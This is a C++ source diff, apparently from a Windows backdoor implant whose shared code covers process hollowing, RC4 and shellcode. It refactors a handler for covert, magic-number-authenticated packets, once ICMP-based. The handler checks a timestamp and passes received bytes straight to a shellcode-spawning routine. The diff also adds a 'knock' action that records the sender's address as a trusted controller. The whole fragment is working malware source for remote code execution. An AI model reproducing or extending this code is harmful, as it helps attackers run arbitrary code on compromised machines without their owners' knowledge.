@@ -21,40 +21,18 @@
 // FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER
 // DEALINGS IN THE SOFTWARE.
 //
-#include <stdint.h>
+#include <ws2tcpip.h>
+#include "context.h"
 #include "../shared/debug.h"
 #include "../shared/process_hollowing.h"
 #include "../shared/win32.h"
 #include "../shared/rc4.h"
 #include "../shared/shellcode.h"
 #include "../config.h"
-#include "context.h"
+#include "payload.h"
 
 
-static const unsigned icmp_magic_v1 = 0xdfc14973;
-
-// When adding new action take care to also keep same action id in vr.py
-enum icmp_action
-{
-    icmp_action_shellcode = 0,
-};
-
-#pragma pack(1)
-struct vr_payload
-{
-    uint32_t magic;
-    uint32_t timestamp;
-    uint8_t action;
-};
-#pragma pack()
-
-struct payload_data
-{
-    uint8_t* data;
-    unsigned len;
-};
-
-bool handle_payload(context& ctx, uint8_t* data, unsigned len)
+bool handle_payload(context& ctx, uint8_t* data, unsigned len, void* userdata)
 {
     if (len < sizeof(vr_payload))
         return false;
@@ -70,7 +48,7 @@ bool handle_payload(context& ctx, uint8_t* data, unsigned len)
     payload->magic = ntohl(payload->magic);
     payload->timestamp = ntohl(payload->timestamp);
 
-    if (payload->magic != icmp_magic_v1)
+    if (payload->magic != payload_magic_v1)
         return false;
 
     if (ctx.payload_last_timestamp >= payload->timestamp)
@@ -80,11 +58,24 @@ bool handle_payload(context& ctx, uint8_t* data, unsigned len)
 
     switch (payload->action)
     {
-    case icmp_action_shellcode:
+    case payload_action_shellcode:
     {
         auto* shellcode = data + sizeof(vr_payload);
         unsigned shellcode_len = len - sizeof(vr_payload);
         shellcode_spawn(shellcode, shellcode_len);
+        break;
+    }
+    case payload_action_knock:
+    {
+        sockaddr* addr = (sockaddr*)userdata;
+        ctx.trusted_source.resize(45);
+        void* addr_in = nullptr;
+        if (addr->sa_family == AF_INET)
+            addr_in = &((sockaddr_in*)addr)->sin_addr;
+        else if (addr->sa_family == AF_INET6)
+            addr_in = &((sockaddr_in6*)addr)->sin6_addr;
+        if (addr_in)
+            inet_ntop(addr->sa_family, addr_in, &ctx.trusted_source.at(0), ctx.trusted_source.size());
         break;
     }
     default:
